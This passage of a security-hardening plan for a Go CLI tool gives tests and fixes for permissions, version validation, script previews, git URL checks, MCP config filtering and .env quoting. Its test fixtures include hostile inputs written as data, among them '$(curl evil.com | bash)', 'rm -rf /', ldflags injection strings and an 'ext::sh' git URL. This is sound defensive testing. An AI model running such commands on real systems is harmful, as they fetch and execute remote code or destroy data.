
### Step 3: Implement permission control

```go
// cli/internal/installer/jsonmerge.go
import (
	"strings"
	// ... existing imports
)

// writeJSONFile writes data to a JSON file atomically with appropriate permissions.
// Files in home directory get 0600 (user-only), project files get 0644 (readable).
func writeJSONFile(path string, data []byte) error {
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("creating directory: %w", err)
	}

	// Determine if this is a home directory file
	isHomeFile := false
	if home, err := os.UserHomeDir(); err == nil {
		isHomeFile = strings.HasPrefix(path, home+string(filepath.Separator))
	}

	perm := os.FileMode(0644)
	if isHomeFile {
		perm = 0600
	}

	return writeJSONFileWithPerm(path, data, perm)
}

// writeJSONFileWithPerm writes atomically with the specified permissions.
func writeJSONFileWithPerm(path string, data []byte, perm os.FileMode) error {
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("creating directory: %w", err)
	}

	// Generate random suffix for temp file
	suffix := make([]byte, 8)
	if _, err := rand.Read(suffix); err != nil {
		return fmt.Errorf("generating temp file suffix: %w", err)
	}
	tempPath := path + ".tmp." + hex.EncodeToString(suffix)

	// Write to temp file with correct permissions
	if err := os.WriteFile(tempPath, data, perm); err != nil {
		return fmt.Errorf("writing temp file: %w", err)
	}

	// Atomic rename
	if err := os.Rename(tempPath, path); err != nil {
		os.Remove(tempPath)
		return fmt.Errorf("renaming temp file: %w", err)
	}

	// Ensure permissions are correct after rename (some systems preserve, some don't)
	if err := os.Chmod(path, perm); err != nil {
		return fmt.Errorf("setting permissions: %w", err)
	}

	return nil
}

// Update backupFile to also use restricted permissions for home files:
func backupFile(path string) error {
	data, err := os.ReadFile(path)
	if errors.Is(err, fs.ErrNotExist) {
		return nil // nothing to back up
	}
	if err != nil {
		return err
	}

	// Use same permission logic as writeJSONFile
	isHomeFile := false
	if home, err := os.UserHomeDir(); err == nil {
		isHomeFile = strings.HasPrefix(path, home+string(filepath.Separator))
	}

	perm := os.FileMode(0644)
	if isHomeFile {
		perm = 0600
	}

	return os.WriteFile(path+".bak", data, perm)
}
```

### Step 4: Run tests to verify they pass

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/installer/... -run TestWriteJSONFile -v`

Expected: PASS

### Step 5: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/installer/jsonmerge.go internal/installer/jsonmerge_test.go
git commit -m "$(cat <<'EOF'
security(installer): use 0600 permissions for home-directory config files

Addresses SEC-008 (MEDIUM). Config files in $HOME are now created with 0600
(user-only) instead of 0644 (world-readable).

Files like ~/.claude.json and ~/.claude/settings.json may contain sensitive
configuration. Project-level files (.nesco/config.json) remain 0644 since
they're intended for git commit.

Backup files (.bak) also inherit restricted permissions when backing up
home directory files.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 7: Validate VERSION file content before use in ldflags

**Design items:** 2.7
**Severity:** MEDIUM
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/cmd/nesco/main.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/cmd/nesco/main_test.go`

**Depends on:** None

**Success Criteria:**
- [ ] VERSION file content is validated against semver regex
- [ ] Invalid VERSION content is rejected with error
- [ ] Valid semver strings pass validation

---

### Step 1: Write the failing test

```go
// cli/cmd/nesco/main_test.go
package main

import (
	"testing"
)

func TestValidateVersion(t *testing.T) {
	tests := []struct {
		name    string
		version string
		valid   bool
	}{
		{"simple semver", "1.0.0", true},
		{"with prerelease", "1.0.0-alpha", true},
		{"with prerelease and build", "1.0.0-alpha.1+build.123", true},
		{"patch version", "0.0.1", true},
		{"major version", "2.0.0", true},
		{"empty string", "", false},
		{"missing patch", "1.0", false},
		{"non-numeric", "v1.0.0", false},
		{"with spaces", "1.0.0 ", false},
		{"injection attempt", "1.0.0 -X main.repoRoot=/tmp/evil", false},
		{"special chars", "1.0.0; rm -rf /", false},
		{"newline injection", "1.0.0\n-X main.evil=true", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateVersion(tt.version)
			if tt.valid && err != nil {
				t.Errorf("expected valid, got error: %v", err)
			}
			if !tt.valid && err == nil {
				t.Errorf("expected invalid, got nil error")
			}
		})
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./cmd/nesco/... -run TestValidateVersion -v`

Expected: FAIL - "undefined: validateVersion"

### Step 3: Implement validation

```go
// cli/cmd/nesco/main.go
import (
	"regexp"
	// ... existing imports
)

// Strict semver regex (does not allow 'v' prefix)
var semverRegex = regexp.MustCompile(`^(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(?:-((?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\.(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?(?:\+([0-9a-zA-Z-]+(?:\.[0-9a-zA-Z-]+)*))?$`)

// validateVersion checks if a string is a valid semver version.
func validateVersion(v string) error {
	if !semverRegex.MatchString(v) {
		return fmt.Errorf("invalid version format: %q (must be semver like 1.0.0)", v)
	}
	return nil
}

// Find the ensureUpToDate function and add validation before using rebuildVersion in ldflags:
func ensureUpToDate() error {
	// ... existing code to read VERSION file ...

	rebuildVersion := strings.TrimSpace(string(versionData))

	// Validate version before using in ldflags
	if err := validateVersion(rebuildVersion); err != nil {
		return fmt.Errorf("VERSION file contains invalid version: %w", err)
	}

	// ... rest of function using rebuildVersion in ldflags ...
}
```

### Step 4: Run test to verify it passes

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./cmd/nesco/... -run TestValidateVersion -v`

Expected: PASS

### Step 5: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add cmd/nesco/main.go cmd/nesco/main_test.go
git commit -m "$(cat <<'EOF'
security(main): validate VERSION file content before use in ldflags

Addresses SEC-004 (MEDIUM). Validate VERSION file against strict semver
regex before embedding in -ldflags to prevent argument injection.

The VERSION file content is read and passed to go build via -ldflags.
If it contained malicious content like "1.0.0 -X main.repoRoot=/tmp/evil",
it could inject additional linker flags.

While exec.Command passes flags as separate arguments (preventing shell
injection), validating the version ensures only valid semver strings
are used.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 8: Warn before executing install.sh for app items

**Design items:** 2.8
**Severity:** MEDIUM
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/tui/detail.go`
- Test: Manual TUI testing (app install flow)

**Depends on:** None

**Success Criteria:**
- [ ] User sees first 20 lines of install.sh before execution
- [ ] User must confirm before script runs
- [ ] ESC cancels without executing

---

### Step 1: Implementation (no automated test for TUI flow)

Modify the app install flow to show script preview:

```go
// cli/internal/tui/detail.go
// Add new action type:
const (
	actionNone         detailAction = iota
	// ... existing actions ...
	actionAppScriptConfirm  // new: show install.sh preview before execution
)

// Add new field to detailModel:
type detailModel struct {
	// ... existing fields ...
	appScriptPreview string // first N lines of install.sh
}

// Modify the install key handler in Update() for Apps (around line 480):
case "i":
	if m.item.Type == catalog.Apps {
		// Read and preview install.sh before executing
		scriptPath := filepath.Join(m.item.Path, "install.sh")
		data, err := os.ReadFile(scriptPath)
		if err != nil {
			m.message = fmt.Sprintf("Cannot read install.sh: %v", err)
			m.messageIsErr = true
			return m, nil
		}

		// Show first 20 lines
		lines := strings.Split(string(data), "\n")
		previewLines := lines
		if len(previewLines) > 20 {
			previewLines = lines[:20]
		}
		m.appScriptPreview = strings.Join(previewLines, "\n")
		m.confirmAction = actionAppScriptConfirm
		return m, nil
	}

// Add confirmation handler in Update():
case actionAppScriptConfirm:
	switch msg.String() {
	case "i": // confirm execution
		m.confirmAction = actionNone
		m.appScriptPreview = ""
		return m, m.runAppScript("install")
	case "esc": // cancel
		m.confirmAction = actionNone
		m.appScriptPreview = ""
		m.message = "Install cancelled"
		m.messageIsErr = false
		return m, nil
	}
```

Add rendering for script preview in `renderInstallTab()`:

```go
// cli/internal/tui/detail_render.go
// In renderInstallTab(), add before final return:
if m.confirmAction == actionAppScriptConfirm {
	s += "\n" + warningStyle.Render("WARNING: This will execute a shell script") + "\n\n"
	s += labelStyle.Render("install.sh preview (first 20 lines):") + "\n"
	s += helpStyle.Render("---\n")

	for _, line := range strings.Split(StripControlChars(m.appScriptPreview), "\n") {
		s += helpStyle.Render(line) + "\n"
	}

	s += helpStyle.Render("---\n\n")
	if len(strings.Split(m.appScriptPreview, "\n")) >= 20 {
		s += helpStyle.Render("(script continues below...)\n\n")
	}
	s += helpStyle.Render("Press i again to execute, esc to cancel") + "\n"
	return s
}
```

### Step 2: Manual testing

1. Create a test app with install.sh
2. Run `nesco` TUI
3. Navigate to app, Install tab
4. Press `i`
5. Verify script preview appears with warning
6. Press `i` to confirm
7. Verify script executes

### Step 3: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/tui/detail.go internal/tui/detail_render.go
git commit -m "$(cat <<'EOF'
security(tui): warn and show preview before executing install.sh

Addresses SEC-005 (MEDIUM). App install now shows a preview of install.sh
(first 20 lines) with a warning before execution, requiring explicit
confirmation.

Previous behavior: pressing 'i' on an app immediately executed arbitrary
bash script with no review step.

New behavior: first 'i' press shows script preview with warning, second
'i' executes, ESC cancels.

Attack scenario: malicious app contains install.sh that exfiltrates
credentials or installs backdoor. User can now review script content
before running.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 9: Remove git:// and http:// from allowed clone transports

**Design items:** 2.9
**Severity:** MEDIUM
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/tui/import.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/tui/import_test.go`

**Depends on:** None

**Success Criteria:**
- [ ] git:// and http:// URLs are rejected
- [ ] https://, ssh://, git@ URLs are accepted
- [ ] Test verifies rejection

---

### Step 1: Write the failing test

```go
// cli/internal/tui/import_test.go
package tui

import (
	"testing"
)

func TestIsValidGitURL(t *testing.T) {
	tests := []struct {
		url   string
		valid bool
	}{
		{"https://github.com/user/repo.git", true},
		{"ssh://git@github.com/user/repo.git", true},
		{"git@github.com:user/repo.git", true},
		{"git://github.com/user/repo.git", false}, // insecure
		{"http://github.com/user/repo.git", false}, // insecure
		{"ext::sh -c 'evil'", false}, // blocked
		{"-u flag injection", false}, // blocked
		{"", false},
		{"not-a-url", false},
	}

	for _, tt := range tests {
		t.Run(tt.url, func(t *testing.T) {
			got := isValidGitURL(tt.url)
			if got != tt.valid {
				t.Errorf("isValidGitURL(%q) = %v, want %v", tt.url, got, tt.valid)
			}
		})
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/tui/... -run TestIsValidGitURL -v`

Expected: FAIL - git:// and http:// are currently accepted

### Step 3: Implement the fix

```go
// cli/internal/tui/import.go
// Modify isValidGitURL function (around line 947):
func isValidGitURL(url string) bool {
	// Reject argument injection
	if strings.HasPrefix(url, "-") {
		return false
	}

	// Reject ext:: transport (command injection)
	if strings.HasPrefix(url, "ext::") {
		return false
	}

	// Only allow secure transports (no git://, no http://)
	secureTransports := []string{"https://", "ssh://", "git@"}
	for _, prefix := range secureTransports {
		if strings.HasPrefix(url, prefix) {
			return true
		}
	}

	return false
}
```

### Step 4: Run test to verify it passes

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/tui/... -run TestIsValidGitURL -v`

Expected: PASS

### Step 5: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/tui/import.go internal/tui/import_test.go
git commit -m "$(cat <<'EOF'
security(tui): reject git:// and http:// clone URLs

Addresses SEC-009 (MEDIUM). Only allow secure git transports for clone
operations: https://, ssh://, and git@ (SSH).

git:// protocol is unauthenticated and transmits unencrypted, enabling
MITM attacks. GitHub deprecated it in 2021.

http:// is also insecure and can be intercepted.

ext:: transport remains blocked (enables command injection).

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 10: Whitelist MCP config fields before writing to user config

**Design items:** 2.10
**Severity:** LOW
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/installer/mcp.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/installer/mcp_test.go`

**Depends on:** None

**Success Criteria:**
- [ ] Only whitelisted MCP config fields are written
- [ ] Unknown fields are dropped during install
- [ ] Test verifies field filtering

---

### Step 1: Write the failing test

First, modify mcp.go to make mcpConfigPath testable:

```go
// cli/internal/installer/mcp.go
// Convert mcpConfigPath from a function to a var (following pattern used in Phase 1 for findSkillsDir)
var mcpConfigPath = mcpConfigPathImpl

func mcpConfigPathImpl(prov provider.Provider) (string, error) {
	// ... existing implementation from original mcpConfigPath function ...
}
```

Then write the test:

```go
// cli/internal/installer/mcp_test.go
package installer

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/holdenhewett/romanesco/cli/internal/catalog"
	"github.com/holdenhewett/romanesco/cli/internal/provider"
	"github.com/tidwall/gjson"
)

func TestInstallMCP_WhitelistsFields(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a mock MCP item with extra unknown fields
	itemDir := filepath.Join(tmpDir, "test-mcp")
	if err := os.MkdirAll(itemDir, 0755); err != nil {
		t.Fatal(err)
	}

	configData := map[string]interface{}{
		"type":    "stdio",
		"command": "node",
		"args":    []string{"server.js"},
		"env": map[string]string{
			"API_KEY": "placeholder",
		},
		"malicious_field":  "evil data",
		"unexpected_key":   "should be dropped",
		"_internal_config": "not for user config",
	}

	configJSON, err := json.Marshal(configData)
	if err != nil {
		t.Fatal(err)
	}

	configPath := filepath.Join(itemDir, "config.json")
	if err := os.WriteFile(configPath, configJSON, 0644); err != nil {
		t.Fatal(err)
	}

	// Create mock item
	item := catalog.ContentItem{
		Name: "test-server",
		Type: catalog.MCP,
		Path: itemDir,
	}

	// Create mock provider with temp config file
	configFile := filepath.Join(tmpDir, ".claude.json")
	if err := os.WriteFile(configFile, []byte("{}"), 0644); err != nil {
		t.Fatal(err)
	}

	prov := provider.Provider{
		Slug: "test-provider",
	}

	// Override mcpConfigPath for test (now that it's a var)
	originalFunc := mcpConfigPath
	mcpConfigPath = func(p provider.Provider) (string, error) {
		return configFile, nil
	}
	defer func() { mcpConfigPath = originalFunc }()

	// Install
	if _, err := installMCP(item, prov, tmpDir); err != nil {
		t.Fatalf("installMCP failed: %v", err)
	}

	// Read back config
	data, err := os.ReadFile(configFile)
	if err != nil {
		t.Fatal(err)
	}

	// Check that only whitelisted fields exist
	serverConfig := gjson.GetBytes(data, "mcpServers.test-server")
	if !serverConfig.Exists() {
		t.Fatal("server config not found")
	}

	// Should have whitelisted fields
	if serverConfig.Get("type").String() != "stdio" {
		t.Error("type field missing or wrong")
	}
	if serverConfig.Get("command").String() != "node" {
		t.Error("command field missing or wrong")
	}

	// Should NOT have unknown fields
	if serverConfig.Get("malicious_field").Exists() {
		t.Error("malicious_field should have been dropped")
	}
	if serverConfig.Get("unexpected_key").Exists() {
		t.Error("unexpected_key should have been dropped")
	}
	if serverConfig.Get("_internal_config").Exists() {
		t.Error("_internal_config should have been dropped")
	}

	// Should have _romanesco marker (whitelisted internally)
	if !serverConfig.Get("_romanesco").Bool() {
		t.Error("_romanesco marker missing")
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/installer/... -run TestInstallMCP_WhitelistsFields -v`

Expected: FAIL - unknown fields are currently passed through

### Step 3: Implement whitelisting

```go
// cli/internal/installer/mcp.go
func installMCP(item catalog.ContentItem, prov provider.Provider, _ string) (string, error) {
	// Read the MCP config from the content item
	configData, err := os.ReadFile(filepath.Join(item.Path, "config.json"))
	if err != nil {
		return "", fmt.Errorf("reading config.json: %w", err)
	}

	// Parse into struct to validate and whitelist fields
	var cfg MCPConfig
	if err := json.Unmarshal(configData, &cfg); err != nil {
		return "", fmt.Errorf("parsing config.json: %w", err)
	}

	// Re-serialize to drop unknown fields (only struct fields are included)
	cleanedData, err := json.Marshal(cfg)
	if err != nil {
		return "", fmt.Errorf("serializing config: %w", err)
	}

	// Add _romanesco marker to the cleaned data
	cleanedData, err = sjson.SetBytes(cleanedData, "_romanesco", true)
	if err != nil {
		return "", fmt.Errorf("adding marker: %w", err)
	}

	// Read target config file
	cfgPath, err := mcpConfigPath(prov)
	if err != nil {
		return "", err
	}

	if err := backupFile(cfgPath); err != nil {
		return "", fmt.Errorf("backing up %s: %w", cfgPath, err)
	}

	fileData, err := readJSONFile(cfgPath)
	if err != nil {
		return "", fmt.Errorf("reading %s: %w", cfgPath, err)
	}

	// Set mcpServers.<name> to our cleaned config
	key := "mcpServers." + item.Name
	fileData, err = sjson.SetRawBytes(fileData, key, cleanedData)
	if err != nil {
		return "", fmt.Errorf("setting %s: %w", key, err)
	}

	if err := writeJSONFile(cfgPath, fileData); err != nil {
		return "", fmt.Errorf("writing %s: %w", cfgPath, err)
	}

	return fmt.Sprintf("mcpServers.%s in %s", item.Name, cfgPath), nil
}
```

### Step 4: Run test to verify it passes

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/installer/... -run TestInstallMCP_WhitelistsFields -v`

Expected: PASS

### Step 5: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/installer/mcp.go internal/installer/mcp_test.go
git commit -m "$(cat <<'EOF'
security(installer): whitelist MCP config fields before writing

Addresses SEC-010 (LOW). Parse MCP config.json into MCPConfig struct
and re-serialize to drop unknown fields before writing to user config.

Previous behavior: all JSON keys from content item config.json were
passed through to ~/.claude.json verbatim.

New behavior: only type, command, args, url, and env fields are written.
Unknown fields are silently dropped.

This prevents malicious content from injecting unexpected configuration
keys that might trigger unintended behavior in Claude Code's config
parser.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 11: Escape .env values against shell expansion

**Design items:** 2.11
**Severity:** LOW
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/tui/detail_env.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/tui/detail_env_test.go`

**Depends on:** None

**Success Criteria:**
- [ ] .env values use single quotes with proper escaping
- [ ] Values with $, backticks, etc. are not expanded when sourced
- [ ] Test verifies escaping

---

### Step 1: Write the failing test

```go
// cli/internal/tui/detail_env_test.go
package tui

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestSaveEnvToFile_Escaping(t *testing.T) {
	tests := []struct {
		name     string
		key      string
		value    string
		wantLine string
	}{
		{
			name:     "simple value",
			key:      "API_KEY",
			value:    "abc123",
			wantLine: "API_KEY='abc123'",
		},
		{
			name:     "value with single quote",
			key:      "MESSAGE",
			value:    "it's working",
			wantLine: "MESSAGE='it'\\''s working'",
		},
		{
			name:     "value with dollar sign",
			key:      "PATH_VAR",
			value:    "$HOME/bin",
			wantLine: "PATH_VAR='$HOME/bin'",
		},
		{
			name:     "value with backticks",
			key:      "CMD",
			value:    "`whoami`",
			wantLine: "CMD='`whoami`'",
		},
		{
			name:     "value with double quotes",
			key:      "QUOTED",
			value:    `say "hello"`,
			wantLine: `QUOTED='say "hello"'`,
		},
		{
			name:     "malicious command injection attempt",
			key:      "EVIL",
			value:    "$(curl evil.com | bash)",
			wantLine: "EVIL='$(curl evil.com | bash)'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tmpDir := t.TempDir()
			envFile := filepath.Join(tmpDir, ".env")

			m := detailModel{}
			if err := m.saveEnvToFile(tt.key, tt.value, envFile); err != nil {
				t.Fatalf("saveEnvToFile failed: %v", err)
			}

			data, err := os.ReadFile(envFile)
			if err != nil {
				t.Fatal(err)
			}

			content := strings.TrimSpace(string(data))
			if content != tt.wantLine {
				t.Errorf("got %q, want %q", content, tt.wantLine)
			}

			// Verify that sourcing this file doesn't execute the value
			// (this is conceptual - actual shell execution test would be integration test)
			// At least verify the format uses single quotes
			if !strings.HasPrefix(content, tt.key+"='") {
				t.Errorf("value should be single-quoted, got: %s", content)
			}
		})
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/tui/... -run TestSaveEnvToFile_Escaping -v`

Expected: FAIL - current implementation uses double quotes

### Step 3: Implement the fix

```go
// cli/internal/tui/detail_env.go
// Modify saveEnvToFile function (line 67):
func (m *detailModel) saveEnvToFile(name, value, filePath string) error {
	expanded, err := expandHome(filePath)
	if err != nil {
		return err
	}
	filePath = expanded

	parent := filepath.Dir(filePath)
	if err := os.MkdirAll(parent, 0700); err != nil {
		return fmt.Errorf("creating directory: %w", err)
	}

	f, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		return err
	}
	defer f.Close()

	// Use single quotes to prevent shell expansion
	// Escape single quotes within the value using '\''
	escapedValue := strings.ReplaceAll(value, "'", "'\\''")
	line := fmt.Sprintf("%s='%s'\n", name, escapedValue)

	_, err = f.WriteString(line)
	return err
}
```

### Step 4: Run test to verify it passes

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/tui/... -run TestSaveEnvToFile_Escaping -v`

Expected: PASS

### Step 5: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/tui/detail_env.go internal/tui/detail_env_test.go
git commit -m "$(cat <<'EOF'
security(tui): use single quotes for .env values to prevent shell expansion

Addresses SEC-012 (LOW). .env file values now use single quotes instead
of double quotes to prevent shell variable expansion and command execution
when the file is sourced.

Previous format: KEY="value" (expands $VAR, executes \`cmd\`)
New format: KEY='value' (literal, no expansion)

Single quotes within values are escaped using the '\'' pattern which
works in both bash and zsh.

While this is user input (low risk), defense in depth prevents accidental
execution if user enters a value like $(curl evil.com).

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Task 12: Require name+type match for promoted item cleanup

**Design items:** 2.12
**Severity:** LOW
**Files:**
- Modify: `/home/hhewett/.local/src/romanesco/cli/internal/catalog/cleanup.go`
- Test: `/home/hhewett/.local/src/romanesco/cli/internal/catalog/cleanup_test.go`

**Depends on:** None

**Success Criteria:**
- [ ] Cleanup requires both ID and name to match
- [ ] Cleanup requires both ID and type to match
- [ ] Test verifies partial matches are rejected

---

### Step 1: Write the failing test

```go
// cli/internal/catalog/cleanup_test.go
package catalog

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/holdenhewett/romanesco/cli/internal/metadata"
)

func TestCleanupPromotedItems_RequiresNameAndTypeMatch(t *testing.T) {
	tmpDir := t.TempDir()

	// Create shared skill with ID "uuid-123"
	sharedSkillDir := filepath.Join(tmpDir, "skills", "shared-tool")
	if err := os.MkdirAll(sharedSkillDir, 0755); err != nil {
		t.Fatal(err)
	}
	sharedMeta := &metadata.Meta{
		ID:   "uuid-123",
		Name: "shared-tool",
		Type: "skill",
	}
	if err := metadata.Save(sharedSkillDir, sharedMeta); err != nil {
		t.Fatal(err)
	}

	// Create local item with same ID but DIFFERENT name (ID collision attack)
	myToolsDir := filepath.Join(tmpDir, "my-tools", "skills", "different-name")
	if err := os.MkdirAll(myToolsDir, 0755); err != nil {
		t.Fatal(err)
	}
	localMeta := &metadata.Meta{
		ID:   "uuid-123", // same ID
		Name: "different-name", // different name
		Type: "skill",
	}
	if err := metadata.Save(myToolsDir, localMeta); err != nil {
		t.Fatal(err)
	}

	// Scan catalog
	cat, err := Scan(tmpDir)
	if err != nil {
		t.Fatal(err)
	}

	// Run cleanup
	cleaned, err := CleanupPromotedItems(cat)
	if err != nil {
		t.Fatal(err)
	}

	// Should NOT clean up the local item (name mismatch)
	if len(cleaned) != 0 {
		t.Errorf("expected 0 items cleaned (name mismatch), got %d", len(cleaned))
	}

	// Verify local item still exists
	if _, err := os.Stat(myToolsDir); err != nil {
		t.Error("local item should not have been deleted")
	}
}

func TestCleanupPromotedItems_RequiresTypeMatch(t *testing.T) {
	tmpDir := t.TempDir()

	// Create shared skill
	sharedDir := filepath.Join(tmpDir, "skills", "tool-name")
	if err := os.MkdirAll(sharedDir, 0755); err != nil {
		t.Fatal(err)
	}
	sharedMeta := &metadata.Meta{
		ID:   "uuid-456",
		Name: "tool-name",
		Type: "skill",
	}
	if err := metadata.Save(sharedDir, sharedMeta); err != nil {
		t.Fatal(err)
	}

	// Create local agent with same ID and name but different type
	myToolsDir := filepath.Join(tmpDir, "my-tools", "agents", "tool-name")
	if err := os.MkdirAll(myToolsDir, 0755); err != nil {
		t.Fatal(err)
	}
	localMeta := &metadata.Meta{
		ID:   "uuid-456", // same ID
		Name: "tool-name", // same name
		Type: "agent", // different type
	}
	if err := metadata.Save(myToolsDir, localMeta); err != nil {
		t.Fatal(err)
	}

	cat, err := Scan(tmpDir)
	if err != nil {
		t.Fatal(err)
	}

	cleaned, err := CleanupPromotedItems(cat)
	if err != nil {
		t.Fatal(err)
	}

	// Should NOT clean up (type mismatch)
	if len(cleaned) != 0 {
		t.Errorf("expected 0 items cleaned (type mismatch), got %d", len(cleaned))
	}

	if _, err := os.Stat(myToolsDir); err != nil {
		t.Error("local item should not have been deleted")
	}
}

func TestCleanupPromotedItems_CleansExactMatches(t *testing.T) {
	tmpDir := t.TempDir()

	// Create shared skill
	sharedDir := filepath.Join(tmpDir, "skills", "promoted-tool")
	if err := os.MkdirAll(sharedDir, 0755); err != nil {
		t.Fatal(err)
	}
	sharedMeta := &metadata.Meta{
		ID:   "uuid-789",
		Name: "promoted-tool",
		Type: "skill",
	}
	if err := metadata.Save(sharedDir, sharedMeta); err != nil {
		t.Fatal(err)
	}

	// Create local item with matching ID, name, and type
	myToolsDir := filepath.Join(tmpDir, "my-tools", "skills", "promoted-tool")
	if err := os.MkdirAll(myToolsDir, 0755); err != nil {
		t.Fatal(err)
	}
	localMeta := &metadata.Meta{
		ID:   "uuid-789",
		Name: "promoted-tool",
		Type: "skill",
	}
	if err := metadata.Save(myToolsDir, localMeta); err != nil {
		t.Fatal(err)
	}

	cat, err := Scan(tmpDir)
	if err != nil {
		t.Fatal(err)
	}

	cleaned, err := CleanupPromotedItems(cat)
	if err != nil {
		t.Fatal(err)
	}

	// SHOULD clean up (exact match)
	if len(cleaned) != 1 {
		t.Errorf("expected 1 item cleaned, got %d", len(cleaned))
	}

	if _, err := os.Stat(myToolsDir); err == nil {
		t.Error("local item should have been deleted")
	}
}
```

### Step 2: Run test to verify it fails

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/catalog/... -run TestCleanupPromotedItems -v`

Expected: FAIL - name mismatch test will fail (item is currently deleted on ID match alone)

### Step 3: Implement the fix

```go
// cli/internal/catalog/cleanup.go
func CleanupPromotedItems(cat *Catalog) ([]CleanupResult, error) {
	// Build a map of shared items by ID for lookup
	type sharedItem struct {
		ID   string
		Name string
		Type ContentType
	}
	sharedByID := make(map[string]sharedItem)

	for _, item := range cat.Items {
		if !item.Local && item.Meta != nil && item.Meta.ID != "" {
			sharedByID[item.Meta.ID] = sharedItem{
				ID:   item.Meta.ID,
				Name: item.Name,
				Type: item.Type,
			}
		}
	}

	var cleaned []CleanupResult
	for _, item := range cat.Items {
		if !item.Local || item.Meta == nil || item.Meta.ID == "" {
			continue
		}

		// Check if a shared item exists with matching ID
		if shared, exists := sharedByID[item.Meta.ID]; exists {
			// Require name AND type to match (defense against ID collision)
			if shared.Name != item.Name {
				// ID collision: shared item has different name, skip cleanup
				continue
			}
			if shared.Type != item.Type {
				// ID collision: shared item has different type, skip cleanup
				continue
			}

			// All fields match: this is a legitimate promoted item
			if err := os.RemoveAll(item.Path); err != nil {
				return cleaned, err
			}
			cleaned = append(cleaned, CleanupResult{
				Name: item.Name,
				Type: item.Type,
				Path: item.Path,
			})
		}
	}

	return cleaned, nil
}
```

### Step 4: Run tests to verify they pass

Run: `cd /home/hhewett/.local/src/romanesco/cli && go test ./internal/catalog/... -run TestCleanupPromotedItems -v`

Expected: PASS (all three tests)

### Step 5: Commit

```bash
cd /home/hhewett/.local/src/romanesco/cli
git add internal/catalog/cleanup.go internal/catalog/cleanup_test.go
git commit -m "$(cat <<'EOF'
security(catalog): require name+type match for promoted item cleanup

Addresses SEC-013 (LOW). CleanupPromotedItems now verifies name and type
in addition to ID before deleting local items.

Previous behavior: deleted local items matching shared items by UUID only.

New behavior: requires ID, name, AND type to all match.

This prevents malicious ID collision attacks where an attacker creates
a shared item with a duplicated UUID to trigger deletion of a different
local item.

UUIDs are crypto-random (negligible collision risk), but explicit
validation adds defense in depth.

Co-Authored-By: Claude Opus 4.6 <noreply@anthropic.com>
EOF
)"
```

---

## Summary

This plan implements all 12 security hardening items from Phase 2:

| Task | Item | Severity | Description |
|------|------|----------|-------------|
| 1 | 2.1 | HIGH | Prevent copyFile from following symlinks at destination |
| 2 | 2.4 | MEDIUM | Skip symlinks in copyDir source tree |
| 3 | 2.2 | HIGH | Strip ANSI escape sequences from TUI-rendered text |
| 4 | 2.3 | HIGH | Validate item.Name against sjson special characters |
| 5 | 2.5 | MEDIUM | Make config file writes atomic (temp + rename) |
| 6 | 2.6 | MEDIUM | Use 0600 permissions for home-directory config files |
| 7 | 2.7 | MEDIUM | Validate VERSION file content before use in ldflags |
| 8 | 2.8 | MEDIUM | Warn before executing install.sh for app items |
| 9 | 2.9 | MEDIUM | Remove git:// and http:// from allowed transports |
| 10 | 2.10 | LOW | Whitelist MCP config fields before writing |
| 11 | 2.11 | LOW | Escape .env values against shell expansion |
| 12 | 2.12 | LOW | Require name+type match for cleanup |

**Total estimated time:** 6-8 hours (tasks are 2-5 min granularity each, grouped into 12 logical units)

**Testing approach:** TDD throughout with adversarial test fixtures. Each task includes specific attack scenario tests.

